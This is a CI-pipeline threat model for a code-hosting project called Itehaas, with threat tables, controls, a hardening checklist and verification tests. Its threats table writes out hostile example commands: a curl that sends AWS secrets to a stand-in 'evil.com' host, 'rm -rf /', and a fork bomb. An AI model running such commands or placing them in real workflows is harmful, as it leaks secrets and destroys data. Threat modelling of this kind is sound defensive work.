# Itehaas — CI Threat Model

**Version:** 2026-09-02
**Reference:** `server/src/routes/ci.ts:37`, `vcs/src/remote/http.rs`, `database/migrations/003_ci.sql`, `009_ci_workflow.sql`

## 1. Components

```
Developer
  ↓ git push (via HTTP `POST /objects/:hash` + `POST /refs/heads/*`)
Repository (`.itehaas/workflows/*.yml`, `.github/workflows/*.yml`, `itehaas.yml`)
  ↓ webhook/poll or manual `POST /ci/run`
Queue (`ci_pipelines` queued → running → success|failed)
  ↓ runPipeline → parseWorkflow YAML → steps[].run
Runner (`executeInRunner` docker --network none OR fallback sh -c)
  ↓ container host (if fallback)
Artifacts (`ci_artifacts` from dist/artifacts/target)
  ↓ GET /ci/pipelines/:id/artifacts (canRead)
```

## 2. Trust Zones

| Zone | Entities | Trust |
|------|----------|-------|
| Developer (human) | Alice (owner), Bob (write), Charlie (read) | Semi-trusted per repo role |
| Repository content | `ITEHAAS_TOKEN` via env, workflow YAML, `run:` scripts | **Untrusted** — even if owner, script can be malicious via compromised commit |
| Queue / Scheduler | Fastify `runPipeline` (in-process `setImmediate`) | Trusted (platform) |
| Runner | Docker `alpine:latest` `--network none` `--pids-limit 128` OR `sh` | Isolation boundary — must be untrusted |
| Host | `data/repos`, PG, `process.env` | Critical — never reachable from runner |
| Artifact store | FS `dist`, `artifacts` | Untrusted — may contain secrets if job writes |

## 3. Threats

| # | Threat | Precondition | Impact |
|---|--------|--------------|--------|
| CI-1 | Host RCE via `sh` fallback | Docker absent, workflow `run: rm -rf /` | Full host takeover, sibling repos read |
| CI-2 | Secret exfil via fork PR | Fork `eve/repo` PR → workflow `run: curl https://evil.com?k=$AWS_SECRET` | Secret leak (SEC-007) |
| CI-3 | Secret leak via logs | `run: env` prints `AWS_SECRET` | `GET /ci/jobs/:id/logs` (canRead) leaks to all readers |
| CI-4 | Privilege escalation via artifacts | `run: echo $SECRET > dist/secret.txt` then `GET /artifacts` | Secret in artifact store |
| CI-5 | Network exfil | `run: curl --connect-timeout 5 https://evil.com` if `--network none` not enforced | Data exfil, SSRF to metadata |
| CI-6 | Resource exhaustion | `run: while true; do :; done` or fork bomb `:(){:|:&};:` | CPU/RAM, pids 128 limits but `--network none` still allows fork bomb inside container |
| CI-7 | Workspace escape | Workflow writes symlink `artifacts → /` then `collectArtifacts` follows | Host file read (SEC-013) |
| CI-8 | Poisoned base image | `docker run alpine:latest` pulls from Docker Hub without pin + verification | Supply chain |
| CI-9 | Queue starvation | Attacker floods `POST /ci/run` 100× → many runners | PG pool exhaustion, disk |

## 4. Controls (existing vs required)

| Control | Existing | Required |
|---------|----------|----------|
| Docker network isolation | `--network none` when docker available | Mandatory, no fallback; also `--network none` + `iptables` deny |
| Resource limits | `--memory 512m --cpus 1 --pids-limit 128` | Add `--memory-swap 512m`, `ulimit nofile 256`, `timeout 600s` per pipeline |
| User | none (runs as root in container) | `--user 65534:65534 --read-only --tmpfs /tmp:rw,noexec,nosuid,size=64m --cap-drop ALL --security-opt no-new-privileges:true --security-opt seccomp=default` |
| Filesystem | `-v repo:/workspace` rw | Instead: `docker create` + `docker cp` tar without symlink follow, or `tar` + `--no-same-owner` |
| Secrets | plaintext `ci_secrets.value`, injected via `-e` + env | Encrypt at rest, inject only for trusted refs, scrub logs `***`, `docker inspect` leaks `-e` → use file or Docker secret, not `-e` in ps |
| Fork isolation | none — fork PR gets same secrets | Fork PR must get empty env; require `isAdmin` to enable fork secrets |
| Artifacts | `fs.readdirSync` follows symlinks | `lstat` + refuse symlink, size limit 10M per artifact, count 20, path under `workspace` only |
| Workflow parsing | `yaml.parse` any file, no schema, no limit | Validate schema: `jobs[].steps[].run` max 5000 chars, max 20 steps, max 10 jobs, reject `uses:` if not allowlisted, no `!tag` |
| Queue | `setImmediate(runPipeline)` no limit | Semaphore `maxConcurrent 2`, queue table with `started_at` timeout → requeue, rate limit `POST /ci/run` |

## 5. Hardening Checklist (Phase 5)

- [ ] Disable `sh` fallback in prod (SEC-008)
- [ ] Add `isDockerAvailable` gate → if false, `UPDATE ci_pipelines SET status='failed', logs='runner unavailable'` no host exec
- [ ] Harden docker args per above
- [ ] Workspace copy via `tar czf - -C repo . --exclude=.itehaas | docker run --network none -i alpine tar xzf - -C /workspace` (no `-v` mount)
- [ ] Encrypt `ci_secrets.value` (libsodium or age)
- [ ] Fork PR secret gate: `if pr.source_repo_id != repo_id → secretsEnv = {}`
- [ ] Log scrub: `logs.replace(new RegExp(Object.values(secretsEnv).join('|'), 'g'), '***')`
- [ ] Artifact lstat + size/count limits + path containment
- [ ] `yaml` schema validation + size 64k limit
- [ ] Concurrency semaphore + timeout 30s per job already, but add global 5 min pipeline timeout
- [ ] Pin image `alpine:3.19@sha256:...` not `latest`

## 6. Verification

- Corpus workflow with `run: env` → logs must contain `***` not secret value
- Fork PR pipeline `run: echo $SECRET` → logs empty
- Host with docker disabled → pipeline fails without `sh -c` in `ps`
- `ls -l /workspace` inside container → `whoami` = `nobody`, `capsh --print` no caps
- `artifacts` symlink → `collectArtifacts` returns 0 and logs warning
